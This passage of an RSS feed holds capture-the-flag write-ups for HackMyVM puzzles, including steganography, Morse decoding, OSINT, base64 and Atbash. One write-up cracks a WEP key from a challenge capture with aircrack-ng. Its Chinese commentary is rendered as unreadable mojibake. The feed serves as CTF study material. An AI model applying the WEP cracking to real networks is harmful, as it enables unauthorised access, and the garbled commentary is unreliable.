sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20035.html</guid><pubDate>Fri, 27 Jun 2025 09:31:21 +0000</pubDate></item><item><title>Challenge 034</title><link>https://7r1UMPHK.github.io/post/Challenge%20034.html</link><description>![image-20250613232956875](https://7r1umphk.github.io/image/20250613232957326.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 034.zip 
-rwxr-xr-x 1 kali kali 3210 Jun 13 11:30 034.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 034.zip 
Archive:  034.zip
  inflating: 034.jpg                 
              
```

ÁúãÁúã

![034](https://7r1umphk.github.io/image/20250613233047100.webp)

googleËØÜÂõæ

![image-20250613233203766](https://7r1umphk.github.io/image/20250613233204073.webp)

```
HMV{Somalia}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20034.html</guid><pubDate>Fri, 27 Jun 2025 09:31:18 +0000</pubDate></item><item><title>Challenge 033</title><link>https://7r1UMPHK.github.io/post/Challenge%20033.html</link><description>![image-20250613223248138](https://7r1umphk.github.io/image/202506132232437.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 033.zip 
-rwxr-xr-x 1 kali kali 1538000 Jun 13 10:33 033.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 033.zip 
Archive:  033.zip
  inflating: 033.pcap                
                    
```

ÊèêÁ§∫ÊòØwepÂØÜÈí•‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ÁàÜÁ†¥

```
aircrack-ng 033.pcap
                                                                                Aircrack-ng 1.7 


                                                                  [00:00:00] Tested 60016 keys (got 17273 IVs)

   KB    depth   byte(vote)
    0    0/  1   4D(28160) 24(23808) 58(23552) 44(22528) B7(22528) 94(21760) D2(21504) 00(20992) 39(20992) 71(20992) CE(20992) 0B(20736) 1E(20736) 4A(20736) 
    1    4/ 34   59(21760) E1(21504) 5B(21504) B0(20992) 56(20736) 98(20736) A6(20736) B4(20480) EF(20480) 86(20480) B1(20480) EA(20224) FD(20224) 10(20224) 
    2   36/ 45   04(19712) 16(19456) 41(19456) 56(19456) 7B(19456) 7C(19456) 81(19456) E6(19456) F1(19456) F2(19456) 8A(19200) B2(19200) E3(19200) 8F(18944) 
    3   14/ 40   45(20992) D3(20992) 94(20736) 04(20736) 0F(20480) 58(20480) B2(20480) 00(20480) 1E(20224) 20(20224) 31(20224) 57(20224) A1(20224) CB(20224) 
    4    0/  1   59(27648) 6F(23040) 25(22016) 20(21760) 38(21760) 30(21504) 53(21504) 67(21504) 84(21504) DB(21504) E7(21504) 08(20992) B8(20736) BE(20736) 

                     KEY FOUND! [ 4D:59:4B:45:59 ] (ASCII: MYKEY )
        Decrypted correctly: 100%

```

ÊâÄ‰ª•flag

```
HMV{MYKEY}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20033.html</guid><pubDate>Fri, 27 Jun 2025 09:31:16 +0000</pubDate></item><item><title>Challenge 032</title><link>https://7r1UMPHK.github.io/post/Challenge%20032.html</link><description>![image-20250613222805234](https://7r1umphk.github.io/image/202506132228210.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 032.zip   
-rwxr-xr-x 1 kali kali 5929 Jun 13 10:28 032.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 032.zip 
Archive:  032.zip
  inflating: 032.gif                 
           
```

ÁúãÁúã

![032](https://7r1umphk.github.io/image/202506132229342.webp)

ÈöîÁùÄÂæ™ÁéØÊí≠ÊîæÂë¢

https://www.pdfpai.com/gif-to-png

ÊâíÊãâ‰∏Ä‰∏ãÈùôÊÄÅÁÖßÁâáÔºåÁÑ∂ÂêéÊãº‰∏Ä‰∏ãflag

```
HMV{gifarefun}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20032.html</guid><pubDate>Fri, 27 Jun 2025 09:31:13 +0000</pubDate></item><item><title>Challenge 031</title><link>https://7r1UMPHK.github.io/post/Challenge%20031.html</link><description>![1111](https://7r1umphk.github.io/image/202506132211238.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 030.zip 
-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 030.zip 
Archive:  030.zip
  inflating: 030.png                 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 031.zip 
-rwxr-xr-x 1 kali kali 973 Jun 13 10:11 031.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 031.zip 
Archive:  031.zip
  inflating: 031.wav                 
              
```

Âê¨‰∏Ä‰∏ãÔºåokÂèàÊòØÊë©ÊñØÂØÜÁ†Å

https://morsecode.world/international/decoder/audio-decoder-adaptive.html

![image-20250613222739128](https://7r1umphk.github.io/image/202506132227527.webp)

```
HMV{MORSEGIVESYOUTHEFLAG}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20031.html</guid><pubDate>Fri, 27 Jun 2025 09:31:11 +0000</pubDate></item><item><title>Challenge 030</title><link>https://7r1UMPHK.github.io/post/Challenge%20030.html</link><description>![image-20250613220818347](https://7r1umphk.github.io/image/202506132208605.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 030.zip 
-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 030.zip 
Archive:  030.zip
  inflating: 030.png                 
                          
```

ÁúãÁúã

![030](https://7r1umphk.github.io/image/202506132208685.webp)

ÊâíÊãâ‰∏Ä‰∏™psÔºåÁºñËæë‰∫Ü‰∏Ä‰∏ã

https://ps.gaoding.com/

Ëá™Â∑±Êîπ‰∏Ä‰∏ã

![image-20250613220903507](https://7r1umphk.github.io/image/202506132209658.webp)

https://cli.im/deqr/other

Ëß£Á†Å
![image-20250613220934058](https://7r1umphk.github.io/image/202506132209311.webp)

```
HMV{qrsospecial}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20030.html</guid><pubDate>Fri, 27 Jun 2025 09:31:08 +0000</pubDate></item><item><title>Challenge 029</title><link>https://7r1UMPHK.github.io/post/Challenge%20029.html</link><description>![image-20250612210313007](https://7r1umphk.github.io/image/202506122103342.webp)

Â≠êÂüüÂêç

https://zh.subdomains.whoisxmlapi.com/lookup

![image-20250613213543362](https://7r1umphk.github.io/image/202506132135949.webp)

```
HMV{publicd0main}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20029.html</guid><pubDate>Fri, 27 Jun 2025 09:31:06 +0000</pubDate></item><item><title>Challenge 028</title><link>https://7r1UMPHK.github.io/post/Challenge%20028.html</link><description>![](https://7r1umphk.github.io/image/202506121923186.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 028.zip
-rwxr-xr-x 1 kali kali 1967 Jun 12 07:23 028.zip
             
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 028.zip 
Archive:  028.zip
  inflating: 028.wav                 
                                           
```

Âê¨‰∫Ü‰∏Ä‰∏ãÔºåÊòØÊë©ÊñØÂØÜÁ†Å

ÊâæÂ∑•ÂÖ∑

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ git clone https://github.com/Ling-Ink/MorseAudioDecoder.git
Cloning into 'MorseAudioDecoder'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 28 (delta 5), reused 27 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 606.49 KiB | 416.00 KiB/s, done.
Resolving deltas: 100% (5/5), done.
                                                                                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd MorseAudioDecoder 
                                                                                           
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/MorseAudioDecoder]
‚îî‚îÄ$ python3 main.py ../028.wav 
_wave_params(nchannels=1, sampwidth=1, framerate=8000, nframes=345520, comptype='NONE', compname='not compressed')
wave avg: 24500
Drawing Morse Image: 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 172760/172760 [00:00&lt;00:00, 3670573.72it/s]
morse block avg: 7.958333333333333
morse blank avg: 4.034722222222222
Morse Result: -/-/-/--/----/-/--/-----/-/-----/--/-/-/--/----/-/-/---/-/--/-/---/----/-/--/-/-/-/--/-/-/--/--/--/-/----/---/-/--/-/----/-/---/--/--/-/---/--/--/-/--/-/-/---/-/----/-/--/-/--/-/-/-/--/-/---/----/-/---/--/--/-/---/--.
Traceback (most recent call last):
  File '/mnt/hgfs/gx/MorseAudioDecoder/main.py', line 120, in &lt;module&gt;
    plain_text += morse_dict[morse]
                  ~~~~~~~~~~^^^^^^^
KeyError: '----'
                                          
```

ÂØÑ

ÂéªÂÖ∂‰ªñÂú∞ÊñπÊâíÊãâ‰∏Ä‰∏ã

https://morsecode.world/international/decoder/audio-decoder-adaptive.html

ÊàëÂø´Êª¥Êª¥Á≠îÂÇª‰∫Ü

![image-20250612210103780](https://7r1umphk.github.io/image/202506122101105.webp)

```
ETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE
```

Ëß£ÂØÜ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat tmp.txt                                
ETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat tmp.txt | sed 's/E/0/g' | sed 's/T/1/g'
011101000110100001100001011101000111001101100100011011110111010101100010011011000110010101100101011011100110001101101111011001000110010101100100
```

![image-20250612210203140](https://7r1umphk.github.io/image/202506122102548.webp)

```
HMV{thatsdoubleencoded}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20028.html</guid><pubDate>Fri, 27 Jun 2025 09:31:03 +0000</pubDate></item><item><title>Challenge 027</title><link>https://7r1UMPHK.github.io/post/Challenge%20027.html</link><description>![image-20250612192123140](https://7r1umphk.github.io/image/202506121921452.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://momo.hackmyvm.eu/t0r1k34s3/ 
Where is my flag?                                                                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/t0r1k34s3/                          
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 12 Jun 2025 11:22:06 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Flag: HMV{flaginmyheader}

Where is my flag?                                                                                                                                                                                   
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20027.html</guid><pubDate>Fri, 27 Jun 2025 09:30:58 +0000</pubDate></item><item><title>Challenge 026</title><link>https://7r1UMPHK.github.io/post/Challenge%20026.html</link><description>![image-20250612191601943](https://7r1umphk.github.io/image/202506121916254.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 026.zip 
-rwxr-xr-x 1 kali kali 160499 Jun 12 07:16 026.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 026.zip 
Archive:  026.zip
  inflating: 026.jpg                 
                       
```

![026](https://7r1umphk.github.io/image/202506121916188.webp)

Âè≥‰∏äËßí

![image-20250612191725946](https://7r1umphk.github.io/image/202506121917179.webp)

![image-20250612191917698](https://7r1umphk.github.io/image/202506121919934.webp)

```
HMV{Turkey}
```

Â∫îËØ•ÊòØËøô‰∏™Ëã±ËØ≠ÔºåËá™Â∑±ËØïËØïsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20026.html</guid><pubDate>Fri, 27 Jun 2025 09:30:56 +0000</pubDate></item><item><title>Challenge 025</title><link>https://7r1UMPHK.github.io/post/Challenge%20025.html</link><description>![image-20250612191237073](https://7r1umphk.github.io/image/202506121912373.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 025.zip 
-rwxr-xr-x 1 kali kali 1495709 Jun 12 07:12 025.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 025.zip 
Archive:  025.zip
  inflating: 025.png                 
                         
```

![025](https://7r1umphk.github.io/image/202506121913972.webp)

![image-20250612191418119](https://7r1umphk.github.io/image/202506121914522.webp)

ÊîæÂ§ß

![image-20250612191435611](https://7r1umphk.github.io/image/202506121914807.webp)

```
HMV{whattimeisit}
```

Â¶ÇÊûú‰∏çÂØπÔºåÁõ¥Êé•ÂØπÁÖß‰∏Ä‰∏ãsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20025.html</guid><pubDate>Fri, 27 Jun 2025 09:30:53 +0000</pubDate></item><item><title>Challenge 024</title><link>https://7r1UMPHK.github.io/post/Challenge%20024.html</link><description>![image-20250612190956179](https://7r1umphk.github.io/image/202506121909489.webp)

Êãø‰∏™ÊµèËßàÂô®ÔºåËÆøÈóÆËøô‰∏™ÁΩëÈ°µÔºå‰Ω†‰ºöÂèëÁé∞flag‰∏ÄÈó™ËÄåËøá

Êãø‰∏™burpÊäìÂ∞±Â•Ω‰∫Ü

![image-20250612191151691](https://7r1umphk.github.io/image/202506121911882.webp)

```
HMV{fastredirect}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20024.html</guid><pubDate>Fri, 27 Jun 2025 09:30:51 +0000</pubDate></item><item><title>Challenge 016</title><link>https://7r1UMPHK.github.io/post/Challenge%20016.html</link><description>![image-20250612182407919](https://7r1umphk.github.io/image/202506121824441.webp)

```
HMV{\033[31mw\033[31mh\033[31my\033[31m i\033[31mm \033[31mn\033[31mo\033[31mt \033[39m m\033[39ma\033[39my\033[39mb\033[39me \033[39mu\033[39ms\033[39me \033[32m g\033[32mr\033[32me\033[32me\033[32mn\033[32mt\033[32mh\033[32me\033[32mf\033[32ml\033[32ma\033[32mg\033[39m}
```

ÁªàÁ´ØÈ¢úËâ≤Ê∑∑Ê∑Ü‰º™Ë£Ö

```
why im not maybe use green the flag
```

ÁªøËâ≤

```
HMV{greentheflag}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20016.html</guid><pubDate>Fri, 27 Jun 2025 09:30:48 +0000</pubDate></item><item><title>Challenge 048</title><link>https://7r1UMPHK.github.io/post/Challenge%20048.html</link><description>![image-20250621125632465](https://7r1umphk.github.io/image/20250621125632761.webp)

‰∏ãËΩΩÔºåËß£Âéã

![48](https://7r1umphk.github.io/image/20250621125716382.webp)

‰∏Ä‰∏™Á±ª‰ºº‰∫éËΩ¶Áâå

google‰∏Ä‰∏ã

![image-20250621125830400](https://7r1umphk.github.io/image/20250621125830567.webp)

‰πåÂÖãÂÖ∞

Ââç‰∏§‰ΩçÂ≠óÊØçË°®Á§∫**Ê≥®ÂÜåÂú∞ÁöÑÂå∫Âüü‰ª£Á†Å**

AA ÊòØÂü∫ËæÖ

```
HMV{kyiv}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20048.html</guid><pubDate>Fri, 27 Jun 2025 09:30:45 +0000</pubDate></item><item><title>Challenge 047</title><link>https://7r1UMPHK.github.io/post/Challenge%20047.html</link><description>![image-20250621124138454](https://7r1umphk.github.io/image/20250621124138743.webp)

```
&lt;pre&gt; magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40] Hint: Use python code for decoding the magic_num_list... &lt;/pre&gt;
```

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 47.zip 
Archive:  47.zip
  inflating: 47.py                   
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 47.       
cat: 47.: No such file or directory
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 47.py 
import string

def magic_encode(flag):
    flag, magic_num_list = divmod(flag, 61)
    return f'{string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase}' [magic_num_list]                                                                                               
```

61 ËøõÂà∂Êò†Â∞Ñ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 47p.py 
import string

base61_table = string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase
magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]

decoded = ''.join(base61_table[i] for i in magic_num_list)
print(decoded)

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ python3 $_
DibmMfOhFtBsFbXfTpNf
  
```

‰ΩÜÊòØÊàëÊãøÂéª‰∫§ÔºåÈîôÁöÑ

ÈÇ£Â∞±Êúâ‰∏ÄÁßçÂèØËÉΩ‰∫ÜÔºåÁºñÁ†ÅË°®ÁöÑÈ°∫Â∫èÂèØËÉΩÊúâÈóÆÈ¢ò

Êàë‰ª¨Áõ¥Êé•ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 47p.py
import string

magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]

tables = {
    'digits[1:] + uppercase + lowercase': string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase,
    'digits + lowercase + uppercase': string.digits + string.ascii_lowercase + string.ascii_uppercase,
    'digits + uppercase + lowercase': string.digits + string.ascii_uppercase + string.ascii_lowercase,
    'uppercase + lowercase + digits': string.ascii_uppercase + string.ascii_lowercase + string.digits,
}

for name, table in tables.items():
    try:
        decoded = ''.join(table[i] for i in magic_num_list)
        print(f'{name} --&gt; {decoded}')
    except IndexError:
        print(f'{name} --&gt; IndexError: Ë°®ÈïøÂ∫¶‰∏çË∂≥')

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ python3 $_
digits[1:] + uppercase + lowercase --&gt; DibmMfOhFtBsFbXfTpNf
digits + lowercase + uppercase --&gt; cHALlEnGeSaReAwEsOmE
digits + uppercase + lowercase --&gt; ChalLeNgEsArEaWeSoMe
uppercase + lowercase + digits --&gt; MrkvVoXqO2K1OkgocyWo
                                                 
```

‰∏Ä‰∏™‰∏™ËØï

Ëøô‰∏™ÊòØÂØπÁöÑcHALlEnGeSaReAwEsOmE

```
HMV{cHALlEnGeSaReAwEsOmE}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20047.html</guid><pubDate>Fri, 27 Jun 2025 09:30:41 +0000</pubDate></item><item><title>Challenge 046</title><link>https://7r1UMPHK.github.io/post/Challenge%20046.html</link><description>ÊöÇÊó∂Ê≤°‰∫ãÂπ≤ÔºåÂà∑‰∏Ä‰∏ãÊåëÊàò

![image-20250621073717593](https://7r1umphk.github.io/image/20250621073717886.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 046.zip         
Archive:  046.zip
  inflating: 046.txt                 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat -A 046.txt 
x=W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm;y=FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=;x+y^M$
^M$
^M$
^M$
^M$
```

ÁõÆÊµãÊòØbase64

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm' | wc -c
130
          
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo -n 'FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | wc -c                            
102
 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cmFtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | base64 -d
[J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=, HV1Dv3QoB3Ebx2oeym0P]
  
```

J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=

HV1Dv3QoB3Ebx2oeym0P

ÂÖàËß£Á¨¨‰∏ÄÊÆµ

```ÁÑ∂ÂêéÊúâÁÇπÊäΩË±°
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo -n 'J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=' | base64 -d 
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' 'zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA'
```

ËøôÊòéÊòæÊòØ‰∏Ä‰∏™ **Â≠óÁ¨¶Êò†Â∞ÑË°®**Ôºå‰πüÂ∞±ÊòØÁî®‰∫é **ÁÆÄÂçïÊõøÊç¢Âä†ÂØÜ**ÁöÑ

Â∑¶ËæπÊòØÊòéÊñáÂ≠óÁ¨¶ÈõÜÔºàÂ∞èÂÜô+Â§ßÂÜôÔºâÔºö

```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
```

Âè≥ËæπÊòØÂØπÂ∫îÁöÑÂØÜÊñáÂ≠óÁ¨¶Êò†Â∞ÑÔºàÂç≥ÔºöÂÄíÂ∫èÔºâÔºö

```
zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA
```

Êç¢Âè•ËØùËØ¥ÔºåËøôÊòØ‰∏Ä‰∏™ **Atbash Cipher**

ÈÇ£‰Ω†ÂèØ‰ª•Áõ¥Êé•ÊãøÂéªCyberChef‰∫Ü

![image-20250621123721248](https://7r1umphk.github.io/image/20250621123721628.webp)

ËøôÊ†∑Â∞±Âá∫flag‰∫Ü

```
HMV{recursion}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20046.html</guid><pubDate>Fri, 27 Jun 2025 09:30:38 +0000</pubDate></item><item><title>Challenge 045</title><link>https://7r1UMPHK.github.io/post/Challenge%20045.html</link><description>![image-20250617122237188](https://7r1umphk.github.io/image/20250617122237544.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 045.zip                     
-rwxr-xr-x 1 kali kali 83848 Jun 17 00:22 045.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 045.zip 
Archive:  045.zip
  inflating: image.png               
     
```

![image](https://7r1umphk.github.io/image/20250617122346695.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 045.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 83848 bytes (82 KiB)

Extracting archive: 045.zip
--
Path = 045.zip
Type = zip
Physical Size = 83848

    
Would you like to replace the existing file:
  Path:     ./image.png
  Size:     79263 bytes (78 KiB)
  Modified: 2023-12-15 11:59:40
with the file from archive:
  Path:     image.png
  Size:     79263 bytes (78 KiB)
  Modified: 2023-12-15 11:59:39
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

Everything is Ok

Size:       79263
Compressed: 83848
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ file 045.zip                                                                                                        
045.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Dec 15 2023 10:59:40, uncompressed size 79263, method=deflate
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ file image.png  
image.png: PNG image data, 304 x 481, 8-bit/color RGBA, non-interlaced
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ exiftool image.png 
ExifTool Version Number         : 13.25
File Name                       : image.png
Directory                       : .
File Size                       : 79 kB
File Modification Date/Time     : 2023:12:15 10:59:39-05:00
File Access Date/Time           : 2025:06:17 00:24:11-04:00
File Inode Change Date/Time     : 2023:12:15 10:59:39-05:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 304
Image Height                    : 481
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
